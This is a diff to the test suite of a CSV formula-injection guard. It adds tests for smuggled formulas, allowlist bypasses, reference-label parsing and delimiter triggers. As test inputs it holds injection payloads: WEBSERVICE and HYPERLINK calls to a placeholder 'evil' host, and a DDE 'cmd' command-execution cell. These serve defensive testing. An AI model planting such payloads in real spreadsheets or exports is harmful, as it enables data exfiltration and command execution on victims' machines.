@@ -787,6 +787,86 @@ function testGuardCsvFullWidthFormulaPrefix() {
         rv.issues.some(function (i) { return i.kind === "formula-prefix-cell"; }));
 }
 
+// A cell's VALUE is what a parser produces, not the bytes the source shows.
+// `""=WEBSERVICE(...)` is an empty quoted section followed by unquoted text, so
+// every RFC 4180 parser yields `=WEBSERVICE(...)`, a live formula. The formula
+// rules decided "quoted" from the first byte and read the SECOND quote as the
+// trigger character, so nothing fired at any profile and the gate served it.
+async function testGuardCsvFormulaBehindEmptyQuotedSection() {
+  var smuggled = 'h\r\n""=WEBSERVICE("http://evil/")\r\n';
+  check("the parser reads a live formula out of the smuggled cell",
+        JSON.stringify(b.csv.parse(smuggled, { header: false }))
+          .indexOf("=WEBSERVICE") !== -1);
+  ["strict", "balanced", "permissive", "email-attachment"].forEach(function (profile) {
+    var rv = b.guardCsv.validate(smuggled, { profile: profile });
+    check("formula behind an empty quoted section detected at " + profile,
+          rv.ok === false &&
+          rv.issues.some(function (i) { return i.kind === "formula-prefix-cell"; }),
+          JSON.stringify(rv.issues.map(function (i) { return i.kind; })));
+  });
+  // And the gate must not hand back a body that still carries it. A
+  // zero-width elsewhere in the row forces the sanitize action rather than a
+  // refusal, which is the path that returned the formula intact.
+  var forced = "h,k\r\nok" + String.fromCharCode(0x200B) +
+               ',""=WEBSERVICE("http://evil/")\r\n';
+  var d = await b.guardCsv.gate({ profile: "strict" })
+    .check({ contentType: "text/csv", bytes: Buffer.from(forced, "utf8") });
+  // A content gate hands the repaired body back in `sanitized`. Reading any
+  // other field gives null for every verdict, and null satisfied this check
+  // against a build that returned the formula intact. So: a refusal has no
+  // body and passes; anything else must return one, and it must be clean.
+  var body = Buffer.isBuffer(d.sanitized) ? d.sanitized.toString("utf8")
+           : typeof d.sanitized === "string" ? d.sanitized : null;
+  check("the gate refuses, or returns a body without the smuggled formula",
+        (d.action === "refuse" && body === null) ||
+        (body !== null &&
+         JSON.stringify(b.csv.parse(body, { header: false })).indexOf("=WEBSERVICE") === -1),
+        "action=" + d.action + " body=" + JSON.stringify(body));
+  // An escaped quote really is the first value character, so a cell whose
+  // value begins with a quote is not a formula and must stay accepted.
+  ['"say ""hi"""', '""', '"a,b"', "plain"].forEach(function (cell) {
+    check("benign cell " + JSON.stringify(cell) + " still accepted",
+          b.guardCsv.validate("h\r\n" + cell + "\r\n", { profile: "strict" }).ok === true);
+  });
+}
+
+// `allowlist` is documented as passing only functions it can identify as safe.
+// It judged the leading name alone, so a denylisted call reached by
+// concatenation or nesting rode through unmitigated.
+function testGuardCsvAllowlistJudgesEveryCall() {
+  var opts = { formulaInjectionPolicy: "allowlist", formulasAllowlist: ["SUM"] };
+  [
+    '=SUM(1)&WEBSERVICE("http://evil/")',
+    '=IF(1,WEBSERVICE("http://evil/"),2)',
+    '=SUM(WEBSERVICE("http://evil/"))',
+    '=WEBSERVICE("http://evil/")',
+  ].forEach(function (cell) {
+    check("allowlist mitigates " + JSON.stringify(cell),
+          b.guardCsv.escapeCell(cell, opts) !== cell,
+          JSON.stringify(b.guardCsv.escapeCell(cell, opts)));
+  });
+  check("allowlist leaves a wholly allowlisted call alone",
+        b.guardCsv.escapeCell("=SUM(1)", opts) === "=SUM(1)");
+  // A quoted argument is text, so a parenthesis inside one does not make the
+  // word before it a call. Reading `Label (` in `=IF(1,"Label (draft)",…)` as
+  // a call turned an allowed formula into a text cell.
+  var textOpts = { formulaInjectionPolicy: "allowlist", formulasAllowlist: ["IF", "SUM"] };
+  [
+    '=IF(1,"Label (draft)","other")',
+    '=SUM(1,"a (b)")',
+    '=IF(1,"x","y")',
+    "=IF(1,2,3)",
+  ].forEach(function (cell) {
+    check("an allowlisted formula with a quoted argument is left alone " +
+          JSON.stringify(cell),
+          b.guardCsv.escapeCell(cell, textOpts) === cell,
+          JSON.stringify(b.guardCsv.escapeCell(cell, textOpts)));
+  });
+  check("a denylisted call after a quoted argument is still mitigated",
+        b.guardCsv.escapeCell('=IF(1,"safe",WEBSERVICE("http://evil/"))', textOpts) !==
+        '=IF(1,"safe",WEBSERVICE("http://evil/"))');
+}
+
 function testGuardCsvDangerousFunctionDeny() {
   var rv = b.guardCsv.validate(
     "a,b\r\nuser,=HYPERLINK(\"http://evil/leak\",\"x\")",
@@ -1644,6 +1724,8 @@ async function run() {
   testGuardCsvFormulaInjectionPrefixTab();
   testGuardCsvFormulaInjectionWrap();
   testGuardCsvFullWidthFormulaPrefix();
+  await testGuardCsvFormulaBehindEmptyQuotedSection();
+  testGuardCsvAllowlistJudgesEveryCall();
   testGuardCsvDangerousFunctionDeny();
   testGuardCsvFormulaInjectionReject();
   testGuardCsvFormulaInjectionEveryPrefix();
@@ -1709,12 +1791,79 @@ async function run() {
   testGuardCsvSerializeTotalTooLarge();
   testGuardCsvDetectBranches();
   testGuardCsvGateDispositionDefault();
+  testSpreadsheetReferencesAreNotFunctionCalls();
   testPolicyVocabularyIsEnforced();
   await testGuardCsvGateOperatorRuleDefaultsAndCatch();
   await testGuardCsvGateSanitizeReserializesFormula();
   await testGuardCsvGateSanitizePreservesTheConfiguredDialect();
   await testGuardCsvAlternateDelimiterFindingIsActuallyMitigated();
   await testGuardCsvFormulaPolicyMatrix();
+}
+
+function testSpreadsheetReferencesAreNotFunctionCalls() {
+  // Under the allowlist policy every call in the cell must be allowed. A sheet
+  // name in single quotes and a structured reference's column label are text,
+  // not calls, so a parenthesis inside either is part of the label.
+  var opts = {
+    profile: "balanced",
+    formulaInjectionPolicy: "allowlist",
+    formulasAllowlist: ["SUM", "AVERAGE"],
+  };
+  function escaped(cell) { return b.guardCsv.escapeCell(cell, opts) !== cell; }
+
+  var neutered = [];
+  [
+    "=SUM('Sales (2026)'!A1:A10)",
+    "=SUM(Sales[Amount (USD)])",
+    "=SUM('My Sheet'!A1)",
+    "=AVERAGE('Q1 (final)'!B2:B9)",
+    "=SUM(A1:A10)",
+    "=SUM(\"a(b\")",
+  ].forEach(function (cell) { if (escaped(cell)) neutered.push(cell); });
+  check("an allowlisted formula holding a reference label stays a formula",
+        neutered.length === 0, neutered.join(" | "));
+
+  // Control: the label skip must not become a place to hide a call.
+  var served = [];
+  [
+    "=HYPERLINK(\"http://evil\")",
+    "=SUM(1)+HYPERLINK(\"http://evil\")",
+    "=SUM(WEBSERVICE(\"http://evil\"))",
+    "=SUM('Sheet'!A1)+WEBSERVICE(\"http://evil\")",
+    "=SUM(Sales[Amount])+HYPERLINK(\"http://evil\")",
+    "=cmd|'/c calc'!A1",
+  ].forEach(function (cell) { if (!escaped(cell)) served.push(cell); });
+  check("a call outside a reference label is still escaped",
+        served.length === 0, served.join(" | "));
+
+  // TAB and | are delimiters of other dialects and are also formula triggers.
+  // Reading either at a cell start as "the cell is empty" hid the trigger.
+  var TAB = String.fromCharCode(9);
+  var missedTrigger = [];
+  [
+    "h\r\n" + TAB + "foo\r\n",
+    "h\r\n|foo\r\n",
+    "h,k\r\na," + TAB + "cmd\r\n",
+    "h,k\r\na,|cmd\r\n",
+  ].forEach(function (csv) {
+    var ks = b.guardCsv.validate(csv, { profile: "balanced", formulaInjectionPolicy: "reject" })
+      .issues.map(function (i) { return i.kind; });
+    if (ks.indexOf("formula-prefix-cell") === -1) missedTrigger.push(JSON.stringify(csv));
+  });
+  check("a delimiter that is also a formula trigger is reported at a cell start",
+        missedTrigger.length === 0, missedTrigger.join(" | "));
+  check("a genuinely empty cell is still not a formula",
+        b.guardCsv.validate("h,k\r\na,,b\r\n", { profile: "balanced", formulaInjectionPolicy: "reject" })
+          .issues.every(function (i) { return i.kind !== "formula-prefix-cell"; }));
+
+  // A cell of unmatched openers must not rescan its own suffix at each one.
+  var growth = require("../helpers/growth");
+  ["[", "'", "\""].forEach(function (opener) {
+    check("the call scan stays linear over unmatched " + opener,
+          !growth.looksSuperlinear(function (n) {
+            b.guardCsv.escapeCell("=SUM(" + opener.repeat(n), opts);
+          }, { small: 16000, large: 64000, threshold: 8 }));
+  });
 }
 
 module.exports = { run: run };
